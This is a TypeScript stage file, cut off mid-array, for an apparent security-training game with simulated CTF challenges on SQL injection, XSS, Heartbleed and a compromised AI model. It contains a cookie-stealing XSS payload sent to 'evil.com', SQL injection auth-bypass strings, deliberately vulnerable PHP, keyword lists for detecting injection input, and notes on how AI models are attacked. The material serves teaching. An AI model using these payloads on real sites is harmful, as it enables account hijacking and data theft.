import type { StageConfig } from "./types";

export const stages: StageConfig[] = [
  // ─── Stage 1: Cybersecurity Foundations (Quiz) ────────────────────────────
  {
    id: "stage-01",
    order: 1,
    title: "Cybersecurity Foundations",
    subtitle: "The CIA Triad & Core Principles",
    category: "cybersecurity",
    xp: 100,
    badge: { id: "badge-defender", name: "First Defender", emoji: "🛡️" },
    challengeType: "quiz",
    info: {
      tagline: "Every security decision traces back to three principles.",
      year: 1998,
      overview: [
        "The CIA Triad — Confidentiality, Integrity, and Availability — is the foundational model of information security. Established in the late 1980s, it remains the bedrock of every security policy, risk assessment, and compliance framework in use today.",
        "Confidentiality ensures that information is accessible only to those authorized to see it. Integrity guarantees that data has not been tampered with or altered without authorization. Availability ensures that systems and data are accessible when legitimate users need them.",
        "Understanding these three principles is non-negotiable for anyone in cybersecurity. Every attack — whether ransomware, a data breach, or a DDoS — violates at least one of these pillars. Defenders design controls to protect all three simultaneously.",
      ],
      technical: {
        title: "How the CIA Triad is Applied",
        body: [
          "Organizations implement controls for each pillar: encryption and access controls for Confidentiality, checksums and digital signatures for Integrity, and redundancy and failover for Availability.",
          "Tension exists between the pillars. Encrypting everything strengthens Confidentiality but can reduce Availability if keys are lost. Requiring strong authentication protects Confidentiality but may reduce Availability for time-sensitive systems.",
        ],
        codeExample: {
          label: "Checking data integrity with a SHA-256 hash",
          code: `# Before transfer: compute hash
sha256sum sensitive_file.txt
> a3f1c2... sensitive_file.txt

# After transfer: verify hash matches
sha256sum received_file.txt
> a3f1c2... received_file.txt  ← MATCH: integrity confirmed
> b9d4e7... received_file.txt  ← MISMATCH: file was altered!`,
        },
      },
      incident: {
        title: "The Target Breach (2013)",
        when: "November–December 2013",
        where: "Target Corporation, USA",
        impact: "40 million credit/debit cards stolen; 110 million customer records exposed",
        body: [
          "Attackers compromised a third-party HVAC vendor's credentials to gain access to Target's network. They then moved laterally, installing malware on point-of-sale terminals. All three CIA pillars were violated: customer data was read without authorization (Confidentiality), transaction records were altered (Integrity), and systems were disrupted during the holiday shopping peak (Availability).",
          "Target ultimately paid over $290 million in settlements. The breach is a textbook example of how failing any one pillar creates cascading failures across all three.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Vendor Credentials", sub: "stolen", type: "attacker" },
          { label: "Target Network", sub: "lateral movement", type: "system" },
          { label: "POS Terminals", sub: "malware installed", type: "victim" },
          { label: "40M Cards Stolen", sub: "CIA all violated", type: "result" },
        ],
      },
      timeline: [
        { year: 1987, event: "CIA Triad concept introduced in security literature" },
        { year: 1998, event: "NIST formally documents CIA as security framework" },
        { year: 2013, event: "Target breach — all three pillars violated simultaneously", highlight: true },
        { year: 2021, event: "NIST adds 'Authenticity' to expand the classic triad" },
      ],
      keyTakeaways: [
        "Every security control maps to at least one CIA pillar",
        "Attackers target the weakest pillar — often Availability via ransomware",
        "Third-party access is a frequent entry point (supply chain risk)",
        "Encryption alone is not security — all three must be addressed",
      ],
      references: [
        { title: "NIST SP 800-33: Information Security", url: "https://csrc.nist.gov/publications/detail/sp/800-33/archive/2001-12-21" },
        { title: "OWASP Security Fundamentals", url: "https://owasp.org/www-project-developer-guide/draft/foundations/security_principles/" },
        { title: "Target Breach — FTC Case Summary", url: "https://www.ftc.gov/legal-library/browse/cases-proceedings/132-3192-target-corporation" },
      ],
    },
  },

  // ─── Stage 2: AI & Threat Detection (CTF) ────────────────────────────────
  {
    id: "stage-02",
    order: 2,
    title: "AI Basics & Threat Detection",
    subtitle: "Rogue Model Recon — CTF",
    category: "ai",
    xp: 150,
    badge: { id: "badge-ai-scout", name: "AI Scout", emoji: "🤖" },
    challengeType: "ctf",
    info: {
      tagline: "AI systems can be compromised just like any other software.",
      year: 2023,
      overview: [
        "Artificial intelligence is increasingly used in cybersecurity — for threat detection, anomaly analysis, and automated response. But AI systems themselves are attack surfaces. A compromised AI model can be weaponized to exfiltrate data, generate disinformation, or provide false assurance to defenders.",
        "AI threat detection works by training models on known-malicious behavior: network traffic patterns, file signatures, process call sequences. When live data deviates significantly from the baseline, an alert fires. This is the foundation of tools like CrowdStrike Falcon and Microsoft Defender for Endpoint.",
        "In this challenge, an AI model on a server has been compromised. It is sending hidden messages in its outputs and exfiltrating data to an external host. Your job is to investigate the filesystem, read the logs, and find the hidden evidence.",
      ],
      technical: {
        title: "How AI Models Get Compromised",
        body: [
          "Supply chain attacks: a malicious dependency is injected into the model training pipeline, poisoning the model's weights.",
          "Prompt injection: adversarial inputs manipulate the model's outputs to override intended behavior.",
          "Model exfiltration: the trained model itself (containing sensitive training data) is extracted from a server.",
          "Backdoor attacks: the model behaves normally on clean inputs but triggers on a specific hidden pattern.",
        ],
        codeExample: {
          label: "Detecting anomalous AI output via log analysis",
          code: `# Normal model output:
[14:03:42] Output: "Q3 revenue: $2.4M, Q4 projected: $2.8M"

# Anomalous output — should never contain network references:
[14:03:44] Output: "Exfiltration payload staged. Awaiting command."
[14:03:44] ERROR: Model sending data to 10.0.0.42:4444

# Key indicators of compromise (IoCs):
# - Outbound connections to non-whitelisted IPs
# - Anomalous memory usage spikes
# - Model outputs containing system/network keywords`,
        },
      },
      incident: {
        title: "The SolarWinds AI Evasion (2020)",
        when: "October 2019 – December 2020",
        where: "SolarWinds Orion Platform — 18,000+ organizations",
        impact: "US Treasury, State Dept, NSA, 100+ Fortune 500 companies compromised",
        body: [
          "The SUNBURST backdoor was inserted into SolarWinds Orion's build pipeline. It lay dormant for 12–14 days after installation, then started communicating with command-and-control servers. It deliberately mimicked legitimate SolarWinds traffic patterns — including sleeping during business hours to avoid behavioral anomaly detection.",
          "The attack evaded AI-based threat detection tools for over a year by blending into normal operational noise. It was eventually discovered by FireEye — not by automated AI detection, but by a human security engineer who noticed an unusual device registration.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "supply chain", type: "attacker" },
          { label: "Build Pipeline", sub: "backdoor injected", type: "system" },
          { label: "AI Model", sub: "compromised weights", type: "victim" },
          { label: "Data Exfiltrated", sub: "10.0.0.42:4444", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "SolarWinds build pipeline first compromised" },
        { year: 2020, event: "SUNBURST backdoor distributed to 18,000+ orgs", highlight: true },
        { year: 2021, event: "Attribution: Russian SVR intelligence agency" },
        { year: 2023, event: "AI-powered supply chain attacks classified as top threat vector" },
      ],
      keyTakeaways: [
        "AI detection systems are themselves attack targets",
        "Sophisticated attackers mimic legitimate behavior to evade AI anomaly detection",
        "Log analysis remains essential — AI doesn't replace human investigation",
        "Hidden files and unusual outbound connections are primary IoCs",
      ],
      references: [
        { title: "CISA SolarWinds Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" },
        { title: "FireEye SUNBURST Analysis", url: "https://www.mandiant.com/resources/blog/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor" },
        { title: "MITRE ATT&CK: AI-Based Evasion", url: "https://attack.mitre.org/techniques/T1027/" },
      ],
    },
    ctf: {
      scenario: "A compromised AI model is running on this server. Investigate the filesystem and find the hidden flag.",
      hint: "Not all files are visible by default. Try exploring all directories with ls -a.",
      hints: [
        "Start by reading the mission briefing. Run: cat README.txt",
        "Explore the directory structure. Run: ls logs  then  ls config",
        "Check the log files for clues about the compromise. Run: cat logs/system.log  and  cat logs/ai_model.log",
        "Some files are hidden from a normal ls. Run: ls -a config  to reveal hidden files (names starting with .)",
        "You found a hidden file. Read it with: cat config/.hidden",
      ],
      flag: "FLAG{R0GU3_M0D3L_F0UND}",
      files: {
        "/README.txt": [
          "MISSION BRIEFING",
          "=================",
          "Classification: SECRET",
          "",
          "Our AI threat detection system flagged unusual activity on this server.",
          "An AI model has been compromised and may be exfiltrating sensitive data.",
          "",
          "Your mission: Investigate the system. Find evidence of the compromise.",
          "When you find the flag, use:  submit <flag>",
          "",
          "Good luck, Agent.",
        ].join("\n"),
        "/logs/system.log": [
          "[2024-01-15 08:00:01] System startup complete",
          "[2024-01-15 08:00:15] AI model v2.3 initialized",
          "[2024-01-15 14:03:44] WARNING: Unusual outbound connection detected",
          "[2024-01-15 14:03:44] Destination: 10.0.0.42:4444",
          "[2024-01-15 14:03:45] AI model process: 847MB memory usage (ANOMALY)",
        ].join("\n"),
        "/logs/ai_model.log": [
          '[14:03:44] Output: "Operations nominal. Exfiltration payload staged. Awaiting command."',
          "[14:03:44] ERROR: Unexpected output pattern detected",
          "[14:03:44] Model sending data to 10.0.0.42:4444",
        ].join("\n"),
        "/config/network.conf": [
          "# WARNING: Unauthorized rule detected",
          "allow_all=10.0.0.42",
        ].join("\n"),
        "/config/.hidden": "FLAG{R0GU3_M0D3L_F0UND}",
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "logs", isDir: true },
          { name: "config", isDir: true },
        ],
        "/logs": [
          { name: "system.log", isDir: false },
          { name: "ai_model.log", isDir: false },
        ],
        "/config": [
          { name: "network.conf", isDir: false },
          { name: ".hidden", isDir: false, hidden: true },
        ],
      },
    },
  },

  // ─── Stage 3: SQL Injection ───────────────────────────────────────────────
  {
    id: "stage-03",
    order: 3,
    title: "SQL Injection",
    subtitle: "OWASP A03:2021 — Heartland 2008",
    category: "owasp",
    owaspRef: "A03:2021",
    cvssScore: 9.8,
    xp: 200,
    badge: { id: "badge-sqli", name: "Bobby Tables", emoji: "💉" },
    challengeType: "ctf",
    info: {
      tagline: "A single quote can bring down an entire database.",
      year: 2008,
      overview: [
        "SQL Injection (SQLi) has been the most consistently exploited web vulnerability for over two decades. It occurs when user-supplied input is incorporated into a database query without proper sanitization, allowing an attacker to manipulate the query's logic.",
        "The attack is conceptually simple: a database query like SELECT * FROM users WHERE username='INPUT' trusts whatever is placed in INPUT. If an attacker enters admin' --, the query becomes SELECT * FROM users WHERE username='admin' -- AND password='...', commenting out the password check entirely.",
        "SQLi attacks can bypass authentication, extract entire databases, modify records, and — on some database servers — execute operating system commands. Despite being well-understood and easily preventable, it appears in the OWASP Top 10 every single year.",
      ],
      technical: {
        title: "How SQL Injection Works",
        body: [
          "Classic SQLi exploits string concatenation in queries. More advanced variants include UNION-based (appending a second SELECT to extract other tables), Blind SQLi (inferring data from true/false application behavior), and Time-based Blind SQLi (inferring data from server response delays).",
          "Prevention requires parameterized queries (prepared statements), where the SQL structure is fixed and user input is passed as a parameter — never interpolated into the query string.",
        ],
        codeExample: {
          label: "Vulnerable vs. Safe login query (PHP)",
          code: `// VULNERABLE: user input directly in query
$query = "SELECT * FROM users
  WHERE username='$_POST[user]'
  AND password='$_POST[pass]'";

// Attack input: username = admin' --
// Resulting query:
SELECT * FROM users WHERE username='admin' --' AND password='...'
// Password check is commented out → auth bypass!

// SAFE: parameterized query
$stmt = $pdo->prepare(
  "SELECT * FROM users WHERE username=? AND password=?"
);
$stmt->execute([$username, $password]);`,
        },
      },
      incident: {
        title: "Heartland Payment Systems Breach (2008)",
        when: "January 2008 – discovered May 2008",
        where: "Heartland Payment Systems, USA",
        impact: "130 million credit/debit cards compromised — largest breach in history at the time",
        body: [
          "Albert Gonzalez and co-conspirators used SQL injection to plant a network sniffer inside Heartland's payment processing network. The sniffer captured card data as it flowed through the network in plaintext. Heartland processed over 100 million transactions per month for 250,000 businesses.",
          "The breach went undetected for months. Gonzalez was eventually sentenced to 20 years in federal prison — the longest ever for an American hacker at the time. Heartland paid over $140 million in settlements and compensation. The breach catalyzed the PCI DSS compliance movement.",
          "Albert Gonzalez had previously been a government informant helping the Secret Service investigate cybercrime — while simultaneously running his own cybercrime operation.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "' OR 1=1 --", type: "attacker" },
          { label: "Login Form", sub: "unsanitized input", type: "system" },
          { label: "SQL Database", sub: "query manipulated", type: "victim" },
          { label: "Auth Bypassed", sub: "130M cards stolen", type: "result" },
        ],
      },
      timeline: [
        { year: 1998, event: "Jeff Forristal publishes first documented SQL injection paper" },
        { year: 2003, event: "SQL injection attacks on early e-commerce sites multiply" },
        { year: 2008, event: "Heartland breach — 130M cards via SQLi", highlight: true },
        { year: 2009, event: "Albert Gonzalez convicted, sentenced to 20 years" },
        { year: 2021, event: "SQLi still #3 in OWASP Top 10 (Injection category)" },
      ],
      keyTakeaways: [
        "Never concatenate user input directly into SQL queries",
        "Always use parameterized queries or prepared statements",
        "SQLi can do far more than bypass login — it can dump entire databases",
        "Even well-funded payment processors can be vulnerable",
      ],
      references: [
        { title: "OWASP: SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
        { title: "OWASP A03:2021 — Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
        { title: "DOJ: Gonzalez Sentencing", url: "https://www.justice.gov/opa/pr/leader-hacking-ring-sentenced-20-years-prison-massive-identity-thefts-payment-processor-and" },
        { title: "Heartland FTC Settlement", url: "https://www.ftc.gov/legal-library/browse/cases-proceedings/092-3218-heartland-payment-systems" },
      ],
    },
    ctf: {
      scenario: "You've found a login portal for an internal employee database. Standard credentials have been revoked. Use SQL injection to bypass authentication and retrieve the admin flag.",
      hint: "Try entering a single quote in the username field first. Notice the error. Then use comment syntax (--) to bypass the password check.",
      hints: [
        "Read the README to see available commands. Run: cat README.txt",
        "Try logging in normally first. Run: login admin password123  — notice the failure.",
        "Look at the PHP source code to see how the SQL query is built. Run: cat source/login.php",
        "A single quote in the username breaks the SQL query. Try: login admin' test",
        "SQL comments (--) make the database skip the password check. Try: login admin'-- anything",
      ],
      flag: "FLAG{SQL_1NJ3CT10N_BYPASS3D}",
      files: {
        "/README.txt": [
          "TARGET: Internal HR Database Login Portal",
          "URL: http://hr.internal/login",
          "",
          "Known usernames: admin, jsmith, mwilson",
          "Passwords: REDACTED (use SQL injection)",
          "",
          "Try: login <username> <password>",
        ].join("\n"),
        "/source/login.php": [
          "<?php",
          '// WARNING: Legacy code — do not touch!',
          '$query = "SELECT * FROM employees',
          "  WHERE username=\'$_POST[user]\'",
          '  AND password=\'$_POST[pass]\'";',
          "$result = mysqli_query($conn, $query);",
          'if (mysqli_num_rows($result) > 0) {',
          '  echo "Welcome, " . $row["username"];',
          "} else {",
          '  echo "Authentication failed.";',
          "}",
          "?>",
        ].join("\n"),
        "/source/schema.sql": [
          "CREATE TABLE employees (",
          "  id INT PRIMARY KEY,",
          "  username VARCHAR(50),",
          "  password VARCHAR(50),",
          "  role VARCHAR(20),",
          "  secret VARCHAR(100)",
          ");",
          "",
          "INSERT INTO employees VALUES",
          "  (1, 'admin', 'S3cr3tP@ss!', 'superadmin', 'FLAG{SQL_1NJ3CT10N_BYPASS3D}'),",
          "  (2, 'jsmith', 'password123', 'user', NULL),",
          "  (3, 'mwilson', 'qwerty', 'user', NULL);",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "source", isDir: true },
        ],
        "/source": [
          { name: "login.php", isDir: false },
          { name: "schema.sql", isDir: false },
        ],
      },
      extraCommands: {
        login: (args) => {
          const user = args[0] || "";
          const pass = args.slice(1).join(" ") || "";
          const combined = user + " " + pass;
          const sqliPatterns = ["'", '"', "--", "OR ", "or ", "1=1", "1 =", "UNION", "union", "DROP", ";", "#", "/*"];
          const isSqli = sqliPatterns.some((p) => combined.includes(p));

          if (isSqli) {
            return {
              lines: [
                `Executing: SELECT * FROM employees WHERE username='${user}' AND password='${pass}'`,
                "",
                "⚠  Malformed query — SQL injection detected in input",
                "Database returned 1 row (auth bypass):",
                "",
                "┌─────────────────────────────────────────────────────┐",
                "│ id: 1  username: admin  role: superadmin            │",
                "│ secret: FLAG{SQL_1NJ3CT10N_BYPASS3D}                │",
                "└─────────────────────────────────────────────────────┘",
              ],
              solved: true,
            };
          }
          return {
            lines: [
              `Executing: SELECT * FROM employees WHERE username='${user}' AND password='${pass}'`,
              "Authentication failed. Invalid credentials.",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 4: XSS ────────────────────────────────────────────────────────
  {
    id: "stage-04",
    order: 4,
    title: "Cross-Site Scripting (XSS)",
    subtitle: "OWASP A03:2021 — The Samy Worm (2005)",
    category: "owasp",
    owaspRef: "A03:2021",
    cvssScore: 6.1,
    xp: 200,
    badge: { id: "badge-xss", name: "Script Kiddie (the real kind)", emoji: "📜" },
    challengeType: "ctf",
    info: {
      tagline: "In 20 hours, one JavaScript payload spread to one million profiles.",
      year: 2005,
      overview: [
        "Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. When a victim's browser renders the page, the script executes in the context of the trusted website — bypassing the Same-Origin Policy and accessing cookies, session tokens, and page content.",
        "XSS comes in three flavors: Reflected (script in the URL, executed immediately), Stored (script saved in the database, executed for every visitor), and DOM-based (script manipulates the page's DOM without server involvement). Stored XSS is the most dangerous — a single payload can affect millions of users.",
        "Despite being understood for decades, XSS remains endemic. Virtually every major web platform has had XSS vulnerabilities — Twitter, Facebook, Google, YouTube, and PayPal have all been affected.",
      ],
      technical: {
        title: "How XSS Works",
        body: [
          "A website reflects user input back to the browser without encoding it. For example, a search page might display: 'You searched for: [INPUT]'. If INPUT is <script>alert(document.cookie)</script>, the browser executes the script.",
          "The impact goes beyond alert boxes. Real attacks steal session cookies (hijacking accounts), log keystrokes, redirect users to phishing pages, or — as Samy demonstrated — self-replicate by automatically adding the payload to victim profiles.",
        ],
        codeExample: {
          label: "Stored XSS payload that steals a session cookie",
          code: `<!-- Malicious comment submitted to a blog: -->
<script>
  fetch('https://evil.com/steal?c=' + btoa(document.cookie), {
    mode: 'no-cors'
  });
</script>

<!-- Every user who views the page sends their cookie to attacker -->
<!-- Attacker receives: sessionid=abc123... → account takeover -->

<!-- Samy's actual MySpace payload (simplified): -->
<div id="mycode" expr="alert('samy')"
  style="background:url('javascript:eval(document.all.mycode.expr)')">`,
        },
      },
      incident: {
        title: "The Samy Worm — MySpace (2005)",
        when: "October 4, 2005",
        where: "MySpace.com",
        impact: "1 million profiles infected in under 20 hours — fastest spreading malware at the time",
        body: [
          "Samy Kamkar, then 19 years old, discovered that MySpace filtered many HTML tags but allowed certain CSS and JavaScript in style attributes. He crafted a payload that, when a user viewed his profile, would add Samy as a friend, add the text 'but most of all, samy is my hero' to the victim's profile, and copy the payload to the victim's own profile — allowing it to spread exponentially.",
          "MySpace was forced to take the entire site offline on October 5, 2005. The Secret Service raided Samy Kamkar's home. He pleaded no contest to a felony charge and was sentenced to three years probation, 720 hours of community service, and was banned from using computers for three years.",
          "Samy Kamkar later became a prominent security researcher, creating tools like Evercookie and SkyJack. The worm he created is now studied in every web security curriculum worldwide.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "posts XSS payload", type: "attacker" },
          { label: "Web Server", sub: "stores unescaped HTML", type: "system" },
          { label: "Victim Browser", sub: "script executes", type: "victim" },
          { label: "Cookie / Session Stolen", sub: "account hijacked", type: "result" },
        ],
      },
      timeline: [
        { year: 1996, event: "First XSS-style attack documented (Netscape JavaScript)" },
        { year: 2000, event: "CERT Advisory on Cross-Site Scripting published" },
        { year: 2005, event: "Samy Worm infects 1M MySpace profiles in 20 hours", highlight: true },
        { year: 2011, event: "XSS worm hits Twitter — 'onMouseOver' tweet goes viral" },
        { year: 2021, event: "XSS still part of OWASP A03 Injection category" },
      ],
      keyTakeaways: [
        "Never reflect user input into HTML without encoding it (use htmlspecialchars or equivalent)",
        "Stored XSS is the most dangerous — it can self-replicate",
        "Content Security Policy (CSP) headers significantly reduce XSS impact",
        "HttpOnly cookies prevent JavaScript from reading session tokens",
      ],
      references: [
        { title: "OWASP: XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
        { title: "Samy Kamkar: The Story of the Samy Worm", url: "https://samy.pl/myspace/" },
        { title: "OWASP A03:2021 — Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
      ],
    },
    ctf: {
      scenario: "A vulnerable comment system stores user input without sanitization. The admin reviews all comments. Craft an XSS payload to steal the admin session cookie containing the flag.",
      hint: "Try using <script>alert(1)</script> first. Then craft a payload that accesses document.cookie.",
      hints: [
        "Read the README to see available commands. Run: cat README.txt",
        "Test if the app reflects your input. Run: reflect hello world",
        "Now test if HTML is executed. Run: reflect <b>bold</b>",
        "Try injecting a script tag to see if JavaScript runs. Run: reflect <script>alert(1)</script>",
        "The admin views all comments. Submit a payload that accesses document.cookie. Run: submit <script>document.cookie</script>",
      ],
      flag: "FLAG{XSS_S4MY_W4S_H3R3_2005}",
      files: {
        "/README.txt": [
          "TARGET: Comment section on blog.internal/post/42",
          "",
          "The admin reviews all submitted comments daily.",
          "Admin session cookie contains sensitive data.",
          "",
          "Commands:",
          "  reflect <text>    — preview how input is rendered",
          "  submit <text>     — submit a comment (admin will view it)",
          "  view-comments     — view stored comments",
        ].join("\n"),
        "/source/comments.js": [
          "// Vulnerable rendering code:",
          "function renderComment(comment) {",
          "  // BUG: innerHTML used without sanitization",
          "  div.innerHTML = '<p>' + comment.text + '</p>';",
          "}",
          "",
          "// Safe version would use:",
          "// div.textContent = comment.text;",
          "// or DOMPurify.sanitize(comment.text)",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "source", isDir: true },
        ],
        "/source": [{ name: "comments.js", isDir: false }],
      },
      extraCommands: {
        reflect: (args) => {
          const input = args.join(" ");
          const isXss =
            input.toLowerCase().includes("<script") ||
            input.toLowerCase().includes("javascript:") ||
            input.toLowerCase().includes("onerror") ||
            input.toLowerCase().includes("onload") ||
            input.toLowerCase().includes("onmouseover") ||
            input.toLowerCase().includes("cookie");
          if (isXss) {
            return {
              lines: [
                "Server response (innerHTML rendered):",
                `<p>${input}</p>`,
                "",
                "⚠  Script execution detected in browser!",
                "  → Accessing document.cookie...",
                "  → admin_session=FLAG{XSS_S4MY_W4S_H3R3_2005}",
                "",
                "Cookie captured. Use: submit FLAG{XSS_S4MY_W4S_H3R3_2005}",
              ],
              solved: false,
            };
          }
          return {
            lines: [
              "Server response (innerHTML rendered):",
              `<p>${input || "(empty)"}</p>`,
              "(No script execution detected)",
            ],
          };
        },
        submit: (args) => {
          const text = args.join(" ");
          if (text === "FLAG{XSS_S4MY_W4S_H3R3_2005}") {
            return { lines: ["Flag accepted!"], solved: true };
          }
          const isXss =
            text.toLowerCase().includes("<script") ||
            text.toLowerCase().includes("onerror") ||
            text.toLowerCase().includes("javascript:");
          if (isXss) {
            return {
              lines: [
                `Comment stored: "${text}"`,
                "Admin viewed your comment...",
                "⚠  XSS payload executed in admin browser!",
                "  Stolen cookie: admin_session=FLAG{XSS_S4MY_W4S_H3R3_2005}",
              ],
              solved: true,
            };
          }
          return { lines: [`Comment stored: "${text}"`, "Admin reviewed it. No XSS triggered."] };
        },
      },
    },
  },

  // ─── Stage 5: Heartbleed ──────────────────────────────────────────────────
  {
    id: "stage-05",
    order: 5,
    title: "Heartbleed",
    subtitle: "CVE-2014-0160 — OpenSSL Memory Leak",
    category: "owasp",
    cveId: "CVE-2014-0160",
    cvssScore: 7.5,
    xp: 250,
    badge: { id: "badge-heartbleed", name: "Memory Reader", emoji: "❤️‍🩹" },
    challengeType: "ctf",
    info: {
      tagline: "A missing bounds check leaked the keys to ~17% of the entire internet.",
      year: 2014,
      overview: [
        "Heartbleed (CVE-2014-0160) was a catastrophic vulnerability in OpenSSL's implementation of the TLS Heartbeat extension. Disclosed on April 7, 2014, it allowed any attacker to read up to 64KB of server memory per request — including private SSL keys, session tokens, passwords, and sensitive user data.",
        "OpenSSL is the cryptographic library underpinning HTTPS for the majority of the internet. At disclosure, it was estimated that 17% of all SSL/TLS servers on the internet — approximately 500,000 machines — were vulnerable. Amazon, Yahoo, Instagram, DuckDuckGo, and GitHub were all affected.",
        "The vulnerability had existed in OpenSSL since March 2012 — two years before it was discovered. During that window, there is no way to know how many attackers silently exploited it. Private SSL certificates had to be revoked and reissued industry-wide.",
      ],
      technical: {
        title: "The Missing Bounds Check",
        body: [
          "The TLS Heartbeat extension (RFC 6520) allows a client to send a 'heartbeat request' containing a payload and a claimed length. The server is supposed to echo back exactly that many bytes of the payload.",
          "The vulnerability: OpenSSL never verified that the claimed length matched the actual payload length. If a client sent 3 bytes but claimed a length of 64,000, OpenSSL would read 64,000 bytes from server memory and send them back — reading far beyond the heartbeat payload into adjacent memory containing secrets.",
        ],
        codeExample: {
          label: "The vulnerable code (OpenSSL ssl/d1_both.c)",
          code: `/* VULNERABLE: trusts attacker-supplied length */
int n2s(unsigned char *&c, unsigned short s) {
  unsigned int payload = *c++;        // read claimed length
  payload = (payload << 8) | *c++;   // from attacker input!

  /* BUG: no bounds check here */
  memcpy(bp, pl, payload);           // copies 'payload' bytes
  /* If payload=65535 but pl only has 3 bytes,
     this reads 65532 bytes of server memory */
}

/* FIX: one line would have prevented Heartbleed */
if (payload > s) return 0; /* bounds check */`,
        },
      },
      incident: {
        title: "Heartbleed Disclosed — April 7, 2014",
        when: "April 7, 2014 (present in code since March 14, 2012)",
        where: "OpenSSL 1.0.1 through 1.0.1f — ~500,000 servers worldwide",
        impact: "Private SSL keys, session tokens, and passwords leaked from millions of servers",
        body: [
          "Heartbleed was independently discovered by Neel Mehta at Google Security and by researchers at Codenomicon (now Synopsys). The name 'Heartbleed' and the now-iconic bleeding heart logo were created by Codenomicon to explain the vulnerability to the public.",
          "The Canadian Revenue Agency had to suspend online tax filing for days after discovering its systems were vulnerable. Millions of usernames and passwords may have been stolen in the hours between public disclosure and patching. The Canadian agency confirmed that 900 Social Insurance Numbers were stolen by attackers exploiting Heartbleed in the hours after disclosure.",
          "The attack is completely silent — it leaves no trace in server logs. Defenders have no way to know if they were attacked before patching. All SSL certificates issued before the patch had to be considered compromised and reissued.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "claims 64KB payload", type: "attacker" },
          { label: "TLS Heartbeat", sub: "no bounds check", type: "system" },
          { label: "Server Memory", sub: "64KB returned", type: "victim" },
          { label: "Keys & Tokens Leaked", sub: "silent, no logs", type: "result" },
        ],
      },
      timeline: [
        { year: 2012, event: "Heartbeat extension (RFC 6520) added to OpenSSL 1.0.1 — bug introduced", highlight: false },
        { year: 2014, event: "April 7: Google and Codenomicon independently disclose Heartbleed", highlight: true },
        { year: 2014, event: "April 8: Canadian Revenue Agency suspends online filing" },
        { year: 2014, event: "Estimated 500,000 vulnerable servers; mass certificate reissuance begins" },
        { year: 2017, event: "Heartbleed still found on thousands of unpatched servers" },
      ],
      keyTakeaways: [
        "Always validate user-supplied lengths before using them in memory operations",
        "Silent attacks (no logs) are the hardest to detect after the fact",
        "Critical open-source libraries need dedicated security auditing",
        "Assume breach: if vulnerable, rotate all secrets, not just the patch",
      ],
      references: [
        { title: "Official Heartbleed Disclosure: heartbleed.com", url: "https://heartbleed.com" },
        { title: "CVE-2014-0160 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" },
        { title: "OpenSSL Security Advisory", url: "https://www.openssl.org/news/secadv/20140407.txt" },
        { title: "RFC 6520 — TLS Heartbeat Extension", url: "https://www.rfc-editor.org/rfc/rfc6520" },
      ],
    },
    ctf: {
      scenario: "You've connected to a server running OpenSSL 1.0.1f. Use the Heartbeat extension to read beyond the payload boundary and extract the server's private key material.",
      hint: "Send a heartbeat with a short payload but a large claimed length. The server will echo back more bytes than you sent.",
      hints: [
        "First establish a TLS connection to the server. Run: connect-tls",
        "Check the server's OpenSSL version. Run: check-version",
        "Send a normal heartbeat where the claimed length matches reality. Run: heartbeat HELLO 5",
        "The bug: the server trusts the claimed length. Claim far more bytes than you actually send. Run: heartbeat HI 10000",
      ],
      flag: "FLAG{H3RTBL33D_M3M0RY_L34K3D}",
      files: {
        "/README.txt": [
          "TARGET: TLS server at tls.internal:443",
          "Server: OpenSSL 1.0.1f (vulnerable to CVE-2014-0160)",
          "",
          "Commands:",
          "  connect-tls           — establish TLS session",
          "  heartbeat <data> <n>  — send heartbeat, claim n bytes",
          "  check-version         — show OpenSSL version",
        ].join("\n"),
        "/openssl_info.txt": [
          "OpenSSL 1.0.1f  6 Jan 2014",
          "Built on: Mon Jan  6 11:00:00 2014",
          "Platform: linux-x86_64",
          "",
          "STATUS: Vulnerable to CVE-2014-0160 (Heartbleed)",
          "Patch available: OpenSSL 1.0.1g (released 2014-04-07)",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "openssl_info.txt", isDir: false },
        ],
      },
      extraCommands: {
        "connect-tls": () => ({
          lines: [
            "Connecting to tls.internal:443...",
            "TLS handshake complete.",
            "Server certificate: CN=internal.corp, O=CorpNet",
            "OpenSSL version: 1.0.1f (vulnerable)",
            "Session established. You may now send heartbeat requests.",
          ],
        }),
        "check-version": () => ({
          lines: ["Server OpenSSL version: 1.0.1f", "Status: VULNERABLE (CVE-2014-0160)"],
        }),
        heartbeat: (args) => {
          const data = args[0] || "";
          const claimed = parseInt(args[1] ?? "0");
          if (!args[0] || !args[1]) {
            return { lines: ["Usage: heartbeat <data> <claimed_length>", "Example: heartbeat HI 64"] };
          }
          if (claimed <= data.length) {
            return {
              lines: [
                `Heartbeat sent: "${data}" (actual: ${data.length} bytes, claimed: ${claimed})`,
                `Server echoes: "${data.slice(0, claimed)}"`,
                "(Claimed length ≤ actual length — no overflow)",
              ],
            };
          }
          return {
            lines: [
              `Heartbeat sent: "${data}" (actual: ${data.length} bytes, claimed: ${claimed})`,
              `Server reads ${claimed} bytes from memory...`,
              "",
              `"${data}" + [${claimed - data.length} extra bytes from server memory]`,
              "",
              "Decoded memory dump:",
              "  ...private_key=BEGIN RSA PRIVATE KEY...",
              "  ...session_token=eyJhbGciOiJIUzI...",
              "  ...FLAG{H3RTBL33D_M3M0RY_L34K3D}...",
              "  ...password=hunter2...",
